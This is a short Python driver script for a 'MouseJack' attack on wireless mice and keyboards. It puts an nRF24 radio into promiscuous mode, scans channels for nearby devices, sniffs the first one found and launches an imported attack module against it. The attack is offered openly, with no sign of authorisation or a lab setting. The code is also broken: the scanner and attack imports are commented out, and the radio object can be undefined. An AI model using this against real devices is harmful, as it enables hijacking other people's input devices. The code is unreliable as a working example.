import tkinter
from tkinter import *
# from tools import Scanner
from lib import nrf24_reset, nrf24
# from attacks import hello_attack
# from attacks import FakeUpdate_attack, wifi_attack
import time


def ping_channel(radio, channels):
    ping = [0x0f, 0x0f, 0x0f, 0x0f]
    for channel in channels:
        radio.set_channel(channel)
        if radio.transmit_payload(ping):
            break


if __name__ == '__main__':
    # win = tkinter.Tk()
    # win.geometry("500x500")
    # win.title("MouseJack Attack")
    # submitButton = Button(win, text="oday")
    # submitButton.place(x=225, y=165)
    # submitButton = Button(win, text="assi")
    # submitButton.place(x=225, y=195)
    # submitButton = Button(win, text="tt med7at")
    # submitButton.place(x=225, y=225)
    timeout = int(input())
    try:
        nrf24_reset.reset_radio(0)
        radio = nrf24.nrf24(0)
    except Exception:
        print("oday")
    radio.enter_promiscuous_mode()
    radio.enable_lna()
    channels = range(2, 84)
    devices_list = Scanner.scan(radio, channels, timeout)
    # print(devices_list['A4:DF:1B:AB:29'])
    radio.enter_sniffer_mode(devices_list[0][0])
    ping_channel(radio, channels)
    wifi_attack = wifi_attack.wifi_attack(devices_list[0][0], radio)
    wifi_attack.run()
